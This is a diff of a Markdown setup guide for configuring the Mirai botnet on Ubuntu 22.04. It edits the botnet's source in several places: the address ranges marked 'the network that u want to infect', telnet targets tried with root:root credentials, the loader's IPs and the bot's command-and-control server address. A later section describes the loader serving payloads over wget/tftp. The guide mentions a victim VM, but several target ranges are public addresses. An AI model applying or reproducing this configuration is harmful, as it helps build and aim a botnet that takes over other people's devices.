@@ -1,16 +1,16 @@
 ## Complete Ubuntu 22.04 Setup 
 
 ### Step 1: modification
- 
+
 1. **mirai.patch :**
-+    return INET_ADDR(51,21,o3,o4); // the network that u want to infect
++    return INET_ADDR(13,48,o3,o4); // the network that u want to infect
 2. **mirai/loader/src/main.c :**
-- snprintf(strbuf, sizeof(strbuf), "51.21.171.%d:23 root:root", i); // the network that u want to infect
-- snprintf(strbuf, sizeof(strbuf), "13.60.172.%d:23 root:root", o4); // the network that u want to infect
-- addrs[0] = inet_addr("16.170.242.95"); // IP privee of the loader
-- if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP publique of the loader
+- snprintf(strbuf, sizeof(strbuf), "13.48.105.%d:23 root:root", i); // the network that u want to infect
+- snprintf(strbuf, sizeof(strbuf), "51.21.250.%d:23 root:root", o4); // the network that u want to infect
+- addrs[0] = inet_addr("172.31.29.142"); // IP privee of the loader
+- if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "16.171.233.156", 80, "16.171.233.156")) == NULL) // IP publique of the loader
 4. **mirai/bot/main.c**
-     srv_addr.sin_addr.s_addr = inet_addr("16.171.160.166");  // IP du CNC
+     srv_addr.sin_addr.s_addr = inet_addr("16.16.58.6");  // IP du CNC
      srv_addr.sin_port = htons(23);                      // Port du bot C2
 ---
 
@@ -570,7 +570,7 @@ echo "Victim VM configured!"
 ---
 
 ## Key Changes Your Patch Makes
-
+ 
 ### 1. **Loader Changes**
 - Binds to `192.168.1.13` (your Loader IP)
 - Uses `192.168.1.13` for wget/tftp server
